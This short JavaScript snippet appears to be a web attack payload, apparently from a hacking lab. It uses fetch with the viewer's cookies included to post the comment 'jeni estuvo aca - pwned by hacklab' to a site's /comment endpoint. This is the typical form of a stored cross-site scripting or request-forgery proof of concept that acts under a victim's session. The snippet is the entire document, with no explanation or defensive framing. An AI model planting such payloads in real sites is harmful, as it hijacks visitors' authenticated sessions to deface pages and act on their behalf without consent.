fetch('/comment', {
    method: 'POST',
    credentials: 'include',
    headers: {'Content-Type': 'application/x-www-form-urlencoded'},
    body: 'content=' + encodeURIComponent('jeni estuvo aca - pwned by hacklab')
});
